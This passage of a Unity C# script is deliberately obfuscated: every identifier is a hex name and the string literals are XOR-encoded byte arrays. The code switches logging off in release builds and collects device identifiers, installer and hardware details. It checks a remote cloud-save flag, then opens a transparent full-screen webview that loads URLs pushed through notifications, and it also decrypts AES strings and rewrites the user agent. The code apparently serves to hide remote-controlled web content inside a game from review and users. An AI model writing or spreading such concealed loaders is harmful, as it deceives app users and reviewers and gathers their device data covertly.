20, 5, 4, 3, 31, 81, 10, 28, 16, 5, 18, 25, 20, 2, 75, 5, 3, 4, 20, 93, 28, 20, 21, 24, 16, 75, 0, 93, 30, 31, 18, 25, 16, 31, 22, 20, 75, 31, 4, 29, 29, 93, 16, 21, 21, 61, 24, 2, 5, 20, 31, 20, 3, 75, 23, 4, 31, 18, 5, 24, 30, 31, 89, 88, 10, 12, 93, 3, 20, 28, 30, 7, 20, 61, 24, 2, 5, 20, 31, 20, 3, 75, 23, 4, 31, 18, 5, 24, 30, 31, 89, 88, 10, 12, 93, 16, 21, 21, 52, 7, 20, 31, 5, 61, 24, 2, 5, 20, 31, 20, 3, 75, 23, 4, 31, 18, 5, 24, 30, 31, 89, 88, 10, 12, 93, 3, 20, 28, 30, 7, 20, 52, 7, 20, 31, 5, 61, 24, 2, 5, 20, 31, 20, 3, 75, 23, 4, 31, 18, 5, 24, 30, 31, 89, 88, 10, 12, 93, 21, 24, 2, 1, 16, 5, 18, 25, 52, 7, 20, 31, 5, 75, 23, 4, 31, 18, 5, 24, 30, 31, 89, 88, 10, 3, 20, 5, 4, 3, 31, 81, 23, 16, 29, 2, 20, 74, 12, 12, 74, 3, 20, 5, 4, 3, 31, 81, 30, 3, 24, 22, 89, 0, 88, 74, 12, 74, 12, 18, 16, 5, 18, 25, 89, 20, 88, 10, 12 }, 113) + _0x4cb14bc7._0x3fe507a8(new byte[5] { 237, 185, 184, 185, 171 }, 144);
    }

    private async Task<bool> _0x97276888(int _0x9b577714 = 5, int _0xb4394a32 = 500)
    {
        List<EntityData> _0x3ddcd69f = new List<EntityData>();
        int _0x2de69678 = 0;
        do
        {
            try
            {
                _0x3ddcd69f = (await CloudSaveService.Instance.Data.Player.QueryAsync(new Query(new List<FieldFilter> { new FieldFilter(_0x4cb14bc7._0x3fe507a8(new byte[8] { 8, 20, 25, 1, 29, 10, 49, 28 }, 120), _0x0703510f, FieldFilter.OpOptions.EQ, true) }, new HashSet<string> { _0x4cb14bc7._0x3fe507a8(new byte[9] { 160, 186, 153, 187, 160, 191, 168, 170, 176 }, 201) }), new QueryOptions())).ToList();
            }
            catch (Exception e)
            {
                {
#if B_LOGS
                    {
                        Debug.Log(_0x4cb14bc7._0x3fe507a8(new byte[32] { 82, 93, 108, 122, 125, 84, 41, 120, 124, 108, 123, 112, 72, 122, 112, 103, 106, 91, 108, 122, 124, 101, 125, 122, 41, 108, 123, 123, 102, 123, 51, 41 }, 9) + e.Message);
                    }
#endif
                }
            }

            await Task.Delay(_0xb4394a32);
        }
        while (_0x3ddcd69f.Count == 0 && _0x2de69678++ < _0x9b577714);
        {
#if B_LOGS
            {
                Debug.Log(_0x4cb14bc7._0x3fe507a8(new byte[32] { 190, 177, 128, 150, 145, 184, 197, 172, 150, 181, 151, 140, 147, 132, 134, 156, 197, 180, 144, 128, 151, 156, 197, 151, 128, 150, 144, 137, 145, 150, 223, 197 }, 229) + JsonConvert.SerializeObject(_0x3ddcd69f, Formatting.Indented));
            }
#endif
        }

        {
#if B_LOGS
            {
                Debug.Log(_0x4cb14bc7._0x3fe507a8(new byte[38] { 125, 114, 67, 85, 82, 123, 6, 111, 85, 118, 84, 79, 80, 71, 69, 95, 6, 119, 83, 67, 84, 95, 6, 84, 67, 85, 83, 74, 82, 85, 6, 69, 73, 83, 72, 82, 28, 6 }, 38) + _0x3ddcd69f.Count);
            }
#endif
        }

        bool _0x704e6497 = true;
        if (_0x3ddcd69f.Count == 0)
        {
            _0x704e6497 = false;
        }
        else
        {
            _0x704e6497 = _0x3ddcd69f.Any(_0xebaa4802 => _0xebaa4802.Data.Any(IsPrivacyItemTrue));
        }

        {
#if B_LOGS
            {
                Debug.Log(_0x4cb14bc7._0x3fe507a8(new byte[25] { 71, 72, 121, 111, 104, 65, 60, 85, 111, 76, 110, 117, 106, 125, 127, 101, 60, 110, 121, 111, 105, 112, 104, 38, 60 }, 28) + _0x704e6497);
            }
#endif
        }

        return _0x704e6497;
    }

    private bool _0x0cfc64c1()
    {
        var _0x16ea9cf2 = Keyboard.current;
        return _0x16ea9cf2 != null && _0x16ea9cf2.escapeKey.wasPressedThisFrame;
    }

    private string _0xc6ff9d2e = "";
    private int _0x86952dea = -1;
    internal bool firstLoadShown = false;
    private float _0x1b85d220 = 0f;
    private IEnumerator _0x7fd14df2(Dictionary<string, object> _0x475fe9e2)
    {
        {
            {
#if B_LOGS
                Debug.Log(_0x4cb14bc7._0x3fe507a8(new byte[30] { 23, 24, 41, 63, 56, 17, 108, 10, 41, 56, 47, 36, 108, 9, 52, 56, 62, 45, 108, 28, 57, 63, 36, 108, 8, 45, 56, 45, 118, 108 }, 76) + string.Join(_0x4cb14bc7._0x3fe507a8(new byte[1] { 197 }, 204), _0x475fe9e2));
#endif
            }
        }

        string _0xfe8c635b = "";
        // Primary source: nested JSON under "notificationData"
        if (_0x475fe9e2 != null && _0x475fe9e2.TryGetValue(_0x4cb14bc7._0x3fe507a8(new byte[16] { 161, 160, 187, 166, 169, 166, 172, 174, 187, 166, 160, 161, 139, 174, 187, 174 }, 207), out var raw))
        {
            try
            {
                var _0x9897e6cc = raw?.ToString();
                var _0xa199b4c4 = JsonConvert.DeserializeObject<Dictionary<string, object>>(_0x9897e6cc);
                if (_0xa199b4c4 != null && _0xa199b4c4.TryGetValue(_0x4cb14bc7._0x3fe507a8(new byte[6] { 230, 240, 251, 241, 252, 241 }, 149), out var val))
                {
                    _0xfe8c635b = val?.ToString();
                }
            }
            catch (Exception e)
            {
#if B_LOGS
                Debug.LogError(_0x4cb14bc7._0x3fe507a8(new byte[30] { 52, 59, 10, 28, 27, 79, 63, 26, 28, 7, 50, 79, 37, 60, 32, 33, 79, 31, 14, 29, 28, 10, 79, 10, 29, 29, 0, 29, 85, 79 }, 111) + e);
#endif
            }
        }

        // Fallback: flat structure
        if (string.IsNullOrEmpty(_0xfe8c635b) && _0x475fe9e2 != null && _0x475fe9e2.TryGetValue(_0x4cb14bc7._0x3fe507a8(new byte[6] { 191, 169, 162, 168, 165, 168 }, 204), out var lab))
        {
            _0xfe8c635b = lab?.ToString();
        }

        {
#if B_LOGS
            {
                Debug.Log(_0x4cb14bc7._0x3fe507a8(new byte[38] { 142, 129, 176, 166, 161, 245, 133, 160, 166, 189, 136, 245, 147, 176, 161, 182, 189, 176, 177, 245, 166, 176, 187, 177, 188, 177, 245, 179, 167, 186, 184, 245, 191, 166, 186, 187, 239, 245 }, 213) + _0xfe8c635b);
            }
#endif
        }

        if (string.IsNullOrEmpty(_0xfe8c635b))
            yield break;
        {
#if B_LOGS
            {
                Debug.Log(_0x4cb14bc7._0x3fe507a8(new byte[38] { 94, 81, 96, 118, 113, 37, 85, 112, 118, 109, 88, 37, 82, 100, 108, 113, 37, 113, 106, 37, 106, 117, 96, 107, 37, 114, 108, 113, 109, 37, 118, 96, 107, 97, 108, 97, 63, 37 }, 5) + _0xfe8c635b);
            }
#endif
        }

        _0x398c5835 = _0xfe8c635b;
        yield return new WaitUntil(() => _0x874cddab);
        var _0xd70542a3 = _0xd3f8bea1(2, 100);
        yield return new WaitUntil(() => _0xd70542a3.IsCompleted);
        string _0xc16629ce = _0xd70542a3.Result;
        if (!string.IsNullOrEmpty(_0xc16629ce))
        {
            string _0x3c16d1d7 = _0x9857d99a(_0xc16629ce, _0xfe8c635b);
            {
#if B_LOGS
                Debug.Log(_0x4cb14bc7._0x3fe507a8(new byte[33] { 192, 207, 254, 232, 239, 187, 203, 238, 232, 243, 198, 187, 201, 254, 247, 244, 250, 255, 187, 204, 254, 249, 205, 242, 254, 236, 187, 236, 242, 239, 243, 161, 187 }, 155) + _0x3c16d1d7);
#endif
            }

            _0x287240ce.Load(_0x3c16d1d7);
        }
    }

    private bool _0x80be8101 = false;
    private void OnApplicationFocus(bool _0x04ecdc58)
    {
        isApplicationFocus = _0x04ecdc58;
        if (_0x04ecdc58 && _0x874cddab)
        {
            _0x03977c36();
        }
    }

    internal void Update()
    {
        if (_0x287240ce == null)
            return;
        if (_0x0cfc64c1())
            _0xa24d553e();
        if (!isApplicationFocus || isApplicationPause)
            return;
        _0x5cd497e1();
        if (_0x3c82bd28 && _0x8f34df81 != null)
            _0x8f34df81.Rotate(0f, 0f, -360f * Time.deltaTime);
    }

    internal bool IsAboutBlank(string _0x51659ca5)
    {
        if (string.IsNullOrEmpty(_0x51659ca5))
            return false;
        return _0x51659ca5.StartsWith(_0x4cb14bc7._0x3fe507a8(new byte[11] { 47, 44, 33, 59, 58, 116, 44, 34, 47, 32, 37 }, 78), StringComparison.OrdinalIgnoreCase);
    }

    private void Awake()
    {
        if (_0xfae286f9 != null)
        {
            Destroy(this.gameObject);
            return;
        }

        EnhancedTouchSupport.Enable();
        Input.backButtonLeavesApp = false;
        {
#if !B_LOGS
            Debug.unityLogger.logEnabled = false;
            Application.SetStackTraceLogType(LogType.Assert, StackTraceLogType.None);
            Application.SetStackTraceLogType(LogType.Exception, StackTraceLogType.None);
            Application.SetStackTraceLogType(LogType.Warning, StackTraceLogType.None);
            Application.SetStackTraceLogType(LogType.Error, StackTraceLogType.None);
            Application.SetStackTraceLogType(LogType.Log, StackTraceLogType.None);
#endif
        }

        _0xfae286f9 = gameObject.GetComponent<_0xcc3984ae>();
        DontDestroyOnLoad(gameObject);
        _0xc6ff9d2e = _0xd2f07fcd = _0x9f107ed5 = "";
        _0xb4e9ddc3 = "";
        _0x874cddab = false;
    }

    private string _0xc20a6ecb = "";
    private string Decrypt(string _0x6588d589, string _0x864887f0)
    {
        try
        {
            var _0x4f61b51c = Convert.FromBase64String(_0x6588d589);
            using var _0x7986388c = Aes.Create();
            _0x7986388c.Key = SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes(_0x864887f0));
            var _0x8725fd8b = new byte[16];
            Buffer.BlockCopy(_0x4f61b51c, 0, _0x8725fd8b, 0, 16);
            _0x7986388c.IV = _0x8725fd8b;
            using var _0x527cad0e = new MemoryStream(_0x4f61b51c, 16, _0x4f61b51c.Length - 16);
            using var _0xa6899a1b = new CryptoStream(_0x527cad0e, _0x7986388c.CreateDecryptor(), CryptoStreamMode.Read);
            using var _0xe6bd7c09 = new StreamReader(_0xa6899a1b, Encoding.UTF8);
            return _0xe6bd7c09.ReadToEnd();
        }
        catch (Exception ex)
        {
            return "";
        }
    }

    private void _0xff561c91()
    {
        {
#if B_LOGS
            Debug.Log(_0x4cb14bc7._0x3fe507a8(new byte[22] { 211, 220, 237, 251, 252, 213, 168, 219, 252, 231, 250, 237, 204, 237, 254, 225, 235, 237, 193, 230, 238, 231 }, 136));
#endif
        }

        _0x2ac6ce07 = SystemInfo.deviceModel;
        _0x1ccaae9d = Application.version;
        _0x256af02d = Application.installMode;
        _0x842a5d44 = Application.installerName;
        _0x10614173 = Application.identifier;
        _0x65470038 = _0x53d69e04();
        _0xe38e456b = _0x5a99627d();
        _0x40b06d89 = SystemInfo.deviceUniqueIdentifier;
        _0x48af6ee9 = SystemInfo.graphicsDeviceName;
        _0x15cb671c = SystemInfo.processorType;
        {
#if B_LOGS
            {
                _0x1ccaae9d = _0x4cb14bc7._0x3fe507a8(new byte[5] { 244, 237, 244, 237, 244 }, 195);
                _0x256af02d = ApplicationInstallMode.Store;
                _0x842a5d44 = _0x4cb14bc7._0x3fe507a8(new byte[19] { 253, 241, 243, 176, 255, 240, 250, 236, 241, 247, 250, 176, 232, 251, 240, 250, 247, 240, 249 }, 158);
                _0xe38e456b = _0x4cb14bc7._0x3fe507a8(new byte[8] { 57, 49, 44, 40, 37, 124, 41, 61 }, 92);
                _0x40b06d89 = Guid.NewGuid().ToString().Replace(_0x4cb14bc7._0x3fe507a8(new byte[1] { 9 }, 36), "");
            }
#endif
        }

        {
#if B_LOGS
            Debug.Log(_0x4cb14bc7._0x3fe507a8(new byte[17] { 68, 75, 122, 108, 107, 66, 63, 123, 122, 105, 82, 112, 123, 122, 115, 37, 63 }, 31) + _0x2ac6ce07);
            Debug.Log(_0x4cb14bc7._0x3fe507a8(new byte[19] { 92, 83, 98, 116, 115, 90, 39, 102, 119, 119, 81, 98, 117, 116, 110, 104, 105, 61, 39 }, 7) + _0x1ccaae9d);
            Debug.Log(_0x4cb14bc7._0x3fe507a8(new byte[20] { 251, 244, 197, 211, 212, 253, 128, 201, 206, 211, 212, 193, 204, 204, 237, 207, 196, 197, 154, 128 }, 160) + _0x256af02d);
            Debug.Log(_0x4cb14bc7._0x3fe507a8(new byte[23] { 176, 191, 142, 152, 159, 182, 203, 130, 133, 152, 159, 138, 135, 135, 142, 153, 184, 159, 132, 153, 142, 209, 203 }, 235) + _0x842a5d44);
            Debug.Log(_0x4cb14bc7._0x3fe507a8(new byte[14] { 191, 176, 129, 151, 144, 185, 196, 133, 148, 148, 173, 128, 222, 196 }, 228) + _0x10614173);
            Debug.Log(_0x4cb14bc7._0x3fe507a8(new byte[14] { 109, 98, 83, 69, 66, 107, 22, 87, 82, 64, 127, 82, 12, 22 }, 54) + _0x65470038);
            Debug.Log(_0x4cb14bc7._0x3fe507a8(new byte[18] { 139, 132, 181, 163, 164, 141, 240, 165, 163, 181, 162, 145, 183, 181, 190, 164, 234, 240 }, 208) + _0xe38e456b);
            Debug.Log(_0x4cb14bc7._0x3fe507a8(new byte[17] { 67, 76, 125, 107, 108, 69, 56, 107, 97, 107, 92, 125, 110, 81, 124, 34, 56 }, 24) + _0x40b06d89);
            Debug.Log(_0x4cb14bc7._0x3fe507a8(new byte[12] { 59, 52, 5, 19, 20, 61, 64, 7, 16, 21, 90, 64 }, 96) + _0x48af6ee9);
            Debug.Log(_0x4cb14bc7._0x3fe507a8(new byte[12] { 57, 54, 7, 17, 22, 63, 66, 1, 18, 23, 88, 66 }, 98) + _0x15cb671c);
#endif
        }
    }

    private string _0x842a5d44 = "";
    private static string ReadPushField(Dictionary<string, object> _0xa145f773, string _0x52ae2362)
    {
        if (_0xa145f773 == null || string.IsNullOrEmpty(_0x52ae2362))
            return string.Empty;
        if (_0xa145f773.TryGetValue(_0x4cb14bc7._0x3fe507a8(new byte[16] { 168, 169, 178, 175, 160, 175, 165, 167, 178, 175, 169, 168, 130, 167, 178, 167 }, 198), out var raw))
        {
            try
            {
                var _0x70a66c4d = JsonConvert.DeserializeObject<Dictionary<string, object>>(raw?.ToString());
                if (_0x70a66c4d != null && _0x70a66c4d.TryGetValue(_0x52ae2362, out var nestedVal))
                {
                    var _0x18c2de8c = nestedVal?.ToString();
                    if (!string.IsNullOrEmpty(_0x18c2de8c))
                        return _0x18c2de8c;
                }
            }
            catch
            {
            }
        }

        if (_0xa145f773.TryGetValue(_0x52ae2362, out var flatVal))
            return flatVal?.ToString() ?? string.Empty;
        return string.Empty;
    }

    private bool _0x6cf507ac = false;
    private int _0xf21fc3d2 = 0;
    internal Rect lastSafe = Rect.zero;
    private string _0x2ac6ce07 = "";
    private IEnumerator _0xd836fa39(string _0x568b5394)
    {
        if (_0x287240ce != null && _0x874cddab)
            yield break;
        _0x287240ce = gameObject.AddComponent<UniWebView>();
        _0xadcca50f(_0x287240ce);
        _0x6b7e34fa(_0x287240ce);
        _0x287240ce.BackgroundColor = Color.clear;
        var _0x308c57b7 = SceneManager.GetActiveScene().GetRootGameObjects();
        if (Camera.main != null)
        {
            Camera.main.clearFlags = CameraClearFlags.SolidColor;
            Camera.main.backgroundColor = Color.clear;
            yield return new WaitForEndOfFrame();
        }

        yield return new WaitForEndOfFrame();
        _0x5cd497e1();
        yield return new WaitForEndOfFrame();
        _0x874cddab = true;
        _0x72fad87f();
        _0xa94fcee3(true);
        _0x831b1d9f = false;
        _0x50ff8d02 = false;
        _0xb6217e62.Clear();
        _0x86952dea = -1;
        firstLoadShown = false;
        _0x91927253 = false;
        _0x80be8101 = false;
        _0x287240ce.SetUserAgent("");
        _0x1b85d220 = Time.realtimeSinceStartup;
        _0x287240ce.Stop();
        _0x287240ce.Load(_0x568b5394);
        _0x287240ce.Show(false, UniWebViewTransitionEdge.None, 0f, null);
        WLog(_0x4cb14bc7._0x3fe507a8(new byte[25] { 213, 249, 241, 246, 184, 207, 253, 250, 206, 241, 253, 239, 184, 209, 246, 241, 236, 241, 249, 244, 184, 203, 240, 247, 239 }, 152));
    }

    public void _0x8133bbab()
    {
        if (_0x874cddab)
            return;
        {
#if B_LOGS
            {
                Debug.Log(_0x4cb14bc7._0x3fe507a8(new byte[33] { 229, 234, 219, 205, 202, 227, 158, 234, 215, 211, 219, 204, 158, 209, 203, 202, 158, 147, 128, 158, 211, 209, 200, 219, 158, 202, 209, 158, 205, 221, 219, 208, 219 }, 190));
            }
#endif
        }

        _0x01a2c31c();
    }

    private string _0x2b43534e = "";
    private void _0x7ad98ca1(string _0xe5a0d8b0)
    {
        Dictionary<string, object> _0x45eb3330;
        try
        {
            _0x45eb3330 = JsonConvert.DeserializeObject<Dictionary<string, object>>(_0xe5a0d8b0);
        }
        catch
        {
            return;
        }

        var _0x7f872ac7 = ReadPushField(_0x45eb3330, _0x4cb14bc7._0x3fe507a8(new byte[3] { 253, 250, 228 }, 136));
        if (string.IsNullOrWhiteSpace(_0x7f872ac7))
            return;
        _0x7f872ac7 = _0x7f872ac7.Trim();
        if (!IsHttpUrl(_0x7f872ac7))
            return;
        if (string.Equals(_0x7f872ac7, _0x16170c7f, StringComparison.Ordinal))
            return;
        _0x16170c7f = _0x7f872ac7;
        OpenUrlExternally(_0x7f872ac7);
    }

    private string _0x0703510f = "";
    // WEB VIEW LOGIC
    public bool _0x874cddab { get; set; }

    private string _0x72539260()
    {
        if (string.IsNullOrEmpty(_0xe38e456b) && _0x287240ce != null)
            _0xe38e456b = _0x287240ce.GetUserAgent();
        if (string.IsNullOrEmpty(_0xe38e456b))
            return string.Empty;
        string _0x895e9bf6 = Regex.Replace(_0xe38e456b, _0x4cb14bc7._0x3fe507a8(new byte[11] { 174, 129, 216, 201, 174, 129, 216, 133, 132, 174, 144 }, 242), string.Empty);
        _0x895e9bf6 = Regex.Replace(_0x895e9bf6, _0x4cb14bc7._0x3fe507a8(new byte[15] { 33, 14, 86, 63, 8, 20, 17, 25, 82, 38, 35, 70, 84, 32, 86 }, 125), string.Empty);
        _0x895e9bf6 = Regex.Replace(_0x895e9bf6, _0x4cb14bc7._0x3fe507a8(new byte[15] { 198, 245, 226, 227, 249, 255, 254, 191, 164, 204, 190, 160, 204, 227, 186 }, 144), string.Empty);
        return Regex.Replace(_0x895e9bf6, _0x4cb14bc7._0x3fe507a8(new byte[6] { 26, 53, 61, 116, 106, 59 }, 70), _0x4cb14bc7._0x3fe507a8(new byte[1] { 236 }, 204)).Trim();
    }

    private UniWebViewPopup _0x60377c97()
    {
        for (int _0x51adec6d = _0xb6217e62.Count - 1; _0x51adec6d >= 0; _0x51adec6d--)
        {
            var _0xa1776cac = _0xb6217e62[_0x51adec6d];
            if (_0xa1776cac != null && _0xa1776cac.IsAlive)
                return _0xa1776cac;
            _0xb6217e62.RemoveAt(_0x51adec6d);
        }

        return null;
    }

    private void _0x72fad87f()
    {
        if (_0xc81032a9 != null)
            return;
        var _0x95209700 = _0xdad400c6();
        _0xc81032a9 = new GameObject(_0x4cb14bc7._0x3fe507a8(new byte[14] { 52, 6, 1, 53, 10, 6, 20, 48, 19, 10, 13, 13, 6, 17 }, 99), typeof(RectTransform), typeof(Text));
        _0x8f34df81 = _0xc81032a9.GetComponent<RectTransform>();
        _0x8f34df81.SetParent(_0x95209700.transform, false);
        _0x8f34df81.anchorMin = new Vector2(0.5f, 0.5f);
        _0x8f34df81.anchorMax = new Vector2(0.5f, 0.5f);
        _0x8f34df81.pivot = new Vector2(0.5f, 0.5f);
        _0x8f34df81.sizeDelta = new Vector2(600f, 600f);
        _0x8f34df81.anchoredPosition = Vector2.zero;
        _0x09e0d31a = _0xc81032a9.GetComponent<Text>();
        _0x09e0d31a.text = _0x4cb14bc7._0x3fe507a8(new byte[1] { 172 }, 131);
        _0x09e0d31a.font = Resources.GetBuiltinResource<Font>(_0x4cb14bc7._0x3fe507a8(new byte[17] { 230, 207, 205, 203, 201, 211, 248, 223, 196, 222, 195, 199, 207, 132, 222, 222, 204 }, 170));
        _0x09e0d31a.fontSize = 200;
        _0x09e0d31a.alignment = TextAnchor.MiddleCenter;
        _0x09e0d31a.color = Color.white;
        _0x09e0d31a.raycastTarget = false;
        _0xc81032a9.SetActive(false);
    }

    private void StopCurrentFailedLoad(UniWebView _0x62ab2f4f)
    {
        _0xa94fcee3(false);
        if (_0x62ab2f4f == null)
            return;
        _0x62ab2f4f.Stop();
        if (_0x62ab2f4f.CanGoBack)
            _0x62ab2f4f.GoBack();
    }

    private bool _0xc11d37df()
    {
        var _0x98a1f264 = _0x60377c97();
        if (_0x98a1f264 == null)
            return false;
        WLog(_0x4cb14bc7._0x3fe507a8(new byte[31] { 89, 112, 99, 117, 102, 112, 99, 116, 49, 115, 112, 114, 122, 49, 60, 47, 49, 97, 126, 97, 100, 97, 49, 86, 126, 83, 112, 114, 122, 43, 49 }, 17) + _0x98a1f264.Id);
        _0x98a1f264.GoBack();
        return true;
    }

    private async Task<bool> _0x55ae829a()
    {
        _0xe4611075.Instance?._0xe41d365c();
        PushNotificationsService.Instance.OnRemoteNotificationReceived += (_0x187529ee) =>
        {
            {
#if B_LOGS
                {
                    Debug.Log(_0x4cb14bc7._0x3fe507a8(new byte[32] { 101, 106, 91, 77, 74, 99, 30, 107, 80, 87, 74, 71, 30, 110, 75, 77, 86, 30, 112, 81, 74, 87, 88, 87, 93, 95, 74, 87, 81, 80, 4, 30 }, 62) + string.Join(_0x4cb14bc7._0x3fe507a8(new byte[1] { 221 }, 212), _0x187529ee));
                }
#endif
            }
        };
        try
        {
            _0xc6ff9d2e = await PushNotificationsService.Instance.RegisterForPushNotificationsAsync();
        }
        catch (Exception ex)
        {
            {
#if B_LOGS
                {
                    Debug.Log(_0x4cb14bc7._0x3fe507a8(new byte[31] { 46, 33, 16, 6, 1, 40, 85, 51, 20, 28, 25, 16, 17, 85, 1, 26, 85, 18, 16, 1, 85, 5, 0, 6, 29, 85, 1, 26, 30, 16, 27 }, 117));
                }
#endif
            }

            _0xc6ff9d2e = "";
        }

        _0x4adfd3ee = !string.IsNullOrEmpty(_0xc6ff9d2e);
        _0x2b43534e = _0x532de8e9();
        {
#if B_LOGS
            Debug.Log(_0x4cb14bc7._0x3fe507a8(new byte[25] { 10, 5, 52, 34, 37, 12, 113, 4, 63, 56, 37, 40, 113, 1, 36, 34, 57, 113, 5, 62, 58, 52, 63, 107, 113 }, 81) + _0xc6ff9d2e);
#endif
        }

        _0xe4611075.Instance?._0xabc06a3f();
        return false;
    }

    private string _0x15cb671c = "";
    private string _0x532de8e9()
    {
        float _0x415cf297 = Time.realtimeSinceStartup;
        if (_0x415cf297 < 0f)
            _0x415cf297 = 0f;
        int _0xdc67e1b6 = (int)(_0x415cf297 * 1000f);
        int _0x0e1a82fd = _0xdc67e1b6 / 60000;
        int _0x50cf1941 = (_0xdc67e1b6 / 1000) % 60;
        int _0xd2868be2 = _0xdc67e1b6 % 1000;
        return string.Format(_0x4cb14bc7._0x3fe507a8(new byte[21] { 22, 93, 87, 93, 93, 16, 87, 22, 92, 87, 93, 93, 16, 87, 22, 95, 87, 93, 93, 93, 16 }, 109), _0x0e1a82fd, _0x50cf1941, _0xd2868be2);
    }

    private string _0x48cafeb8 = "";
    private IEnumerator _0x65ca61a2()
    {
        yield return RequestAndroidPermissionIfNeeded(Permission.Camera);
    }

    private bool _0x50ff8d02 = false;
    private async Task<bool> _0xa2096361()
    {
        {
#if B_LOGS
            Debug.Log(_0x4cb14bc7._0x3fe507a8(new byte[37] { 47, 32, 17, 7, 0, 41, 84, 39, 29, 19, 26, 61, 26, 33, 26, 29, 0, 13, 39, 17, 6, 2, 29, 23, 17, 7, 53, 26, 27, 26, 13, 25, 27, 1, 7, 24, 13 }, 116));
#endif
        }

        try
        {
            var _0x960f5065 = new InitializationOptions();
            await UnityServices.InitializeAsync(_0x960f5065);
            {
#if B_LOGS
                Debug.Log(_0x4cb14bc7._0x3fe507a8(new byte[32] { 36, 43, 26, 12, 11, 34, 95, 42, 17, 22, 11, 6, 44, 26, 13, 9, 22, 28, 26, 12, 95, 54, 17, 22, 11, 22, 30, 19, 22, 5, 26, 27 }, 127));
#endif
            }
        }
        catch (Exception ex)
        {
            {
#if B_LOGS
                Debug.Log(_0x4cb14bc7._0x3fe507a8(new byte[20] { 160, 177, 167, 160, 212, 161, 154, 157, 128, 141, 167, 145, 134, 130, 157, 151, 145, 135, 206, 212 }, 244) + ex.Message);
#endif
            }

            _0xfae286f9?._0x01a2c31c();
            return true;
        }

        bool _0x7e415375 = false;
        do
        {
            try
            {
                await AuthenticationService.Instance.SignInAnonymouslyAsync();
                _0x7e415375 = true;
                {
                    {
#if B_LOGS
                        Debug.Log(_0x4cb14bc7._0x3fe507a8(new byte[37] { 67, 76, 125, 107, 108, 69, 56, 75, 113, 127, 118, 53, 113, 118, 56, 89, 118, 119, 118, 97, 117, 119, 109, 107, 54, 56, 72, 116, 121, 97, 125, 106, 56, 81, 92, 34, 56 }, 24) + AuthenticationService.Instance.PlayerId);
#endif
                    }

                    _0x0703510f = AuthenticationService.Instance.PlayerId;
                }
            }
            catch (AuthenticationException ex)
            {
                {
#if B_LOGS
                    Debug.Log(_0x4cb14bc7._0x3fe507a8(new byte[25] { 66, 83, 69, 66, 54, 69, 127, 113, 120, 59, 127, 120, 54, 87, 99, 98, 126, 54, 83, 68, 68, 89, 68, 44, 54 }, 22) + ex.Message);
#endif
                }

                _0xfae286f9?._0x01a2c31c();
                return true;
            }
            catch (RequestFailedException ex)
            {
                {
#if B_LOGS
                    Debug.Log(_0x4cb14bc7._0x3fe507a8(new byte[28] { 57, 40, 62, 57, 77, 62, 4, 10, 3, 64, 4, 3, 77, 63, 8, 28, 24, 8, 30, 25, 77, 40, 63, 63, 34, 63, 87, 77 }, 109) + ex.Message);
#endif
                }

                _0xfae286f9?._0x01a2c31c();
                return true;
            }
        }
        while (!_0x7e415375);
        return false;
    }

    private string _0x8f1756b6()
    {
        string _0xac82d563 = _0x72539260();
        if (string.IsNullOrEmpty(_0xac82d563))
            return _0x4cb14bc7._0x3fe507a8(new byte[7] { 47, 54, 48, 61, 121, 105, 98 }, 89);
        string _0x01c87790 = _0xac82d563.Replace(_0x4cb14bc7._0x3fe507a8(new byte[1] { 159 }, 195), _0x4cb14bc7._0x3fe507a8(new byte[2] { 59, 59 }, 103)).Replace(_0x4cb14bc7._0x3fe507a8(new byte[1] { 223 }, 248), _0x4cb14bc7._0x3fe507a8(new byte[2] { 28, 103 }, 64));
        var _0x4b167293 = Regex.Match(_0xac82d563, _0x4cb14bc7._0x3fe507a8(new byte[12] { 167, 140, 150, 139, 137, 129, 203, 204, 184, 128, 207, 205 }, 228));
        string _0x836cbed0 = _0x4b167293.Success ? _0x4b167293.Groups[1].Value : _0x4cb14bc7._0x3fe507a8(new byte[3] { 75, 72, 74 }, 122);
        return _0x4cb14bc7._0x3fe507a8(new byte[12] { 156, 210, 193, 218, 215, 192, 221, 219, 218, 156, 157, 207 }, 180) + _0x4cb14bc7._0x3fe507a8(new byte[8] { 25, 14, 29, 79, 26, 14, 82, 72 }, 111) + _0x01c87790 + _0x4cb14bc7._0x3fe507a8(new byte[2] { 19, 15 }, 52) + _0x4cb14bc7._0x3fe507a8(new byte[30] { 222, 201, 218, 136, 216, 218, 199, 220, 199, 149, 230, 201, 222, 193, 207, 201, 220, 199, 218, 134, 216, 218, 199, 220, 199, 220, 209, 216, 205, 147 }, 168) + _0x4cb14bc7._0x3fe507a8(new byte[121] { 83, 64, 91, 86, 65, 92, 90, 91, 21, 81, 80, 83, 29, 90, 87, 95, 25, 94, 80, 76, 25, 67, 84, 89, 28, 78, 65, 71, 76, 78, 122, 87, 95, 80, 86, 65, 27, 81, 80, 83, 92, 91, 80, 101, 71, 90, 69, 80, 71, 65, 76, 29, 90, 87, 95, 25, 94, 80, 76, 25, 78, 82, 80, 65, 15, 83, 64, 91, 86, 65, 92, 90, 91, 29, 28, 78, 71, 80, 65, 64, 71, 91, 21, 67, 84, 89, 14, 72, 25, 86, 90, 91, 83, 92, 82, 64, 71, 84, 87, 89, 80, 15, 65, 71, 64, 80, 72, 28, 14, 72, 86, 84, 65, 86, 93, 29, 80, 28, 78, 72, 72 }, 53) + _0x4cb14bc7._0x3fe507a8(new byte[26] { 124, 125, 126, 48, 104, 106, 119, 108, 119, 52, 63, 109, 107, 125, 106, 89, 127, 125, 118, 108, 63, 52, 109, 121, 49, 35 }, 24) + _0x4cb14bc7._0x3fe507a8(new byte[52] { 31, 30, 29, 83, 11, 9, 20, 15, 20, 87, 92, 26, 11, 11, 45, 30, 9, 8, 18, 20, 21, 92, 87, 14, 26, 85, 9, 30, 11, 23, 26, 24, 30, 83, 84, 37, 54, 20, 1, 18, 23, 23, 26, 39, 84, 84, 87, 92, 92, 82, 82, 64 }, 123) + _0x4cb14bc7._0x3fe507a8(new byte[37] { 204, 205, 206, 128, 216, 218, 199, 220, 199, 132, 143, 216, 196, 201, 220, 206, 199, 218, 197, 143, 132, 143, 228, 193, 198, 221, 208, 136, 201, 218, 197, 222, 144, 196, 143, 129, 147 }, 168) + _0x4cb14bc7._0x3fe507a8(new byte[34] { 180, 181, 182, 248, 160, 162, 191, 164, 191, 252, 247, 166, 181, 190, 180, 191, 162, 247, 252, 247, 151, 191, 191, 183, 188, 181, 240, 153, 190, 179, 254, 247, 249, 235 }, 208) + _0x4cb14bc7._0x3fe507a8(new byte[30] { 146, 147, 144, 222, 134, 132, 153, 130, 153, 218, 209, 155, 151, 142, 162, 153, 131, 149, 158, 166, 153, 159, 152, 130, 133, 209, 218, 195, 223, 205 }, 246) + 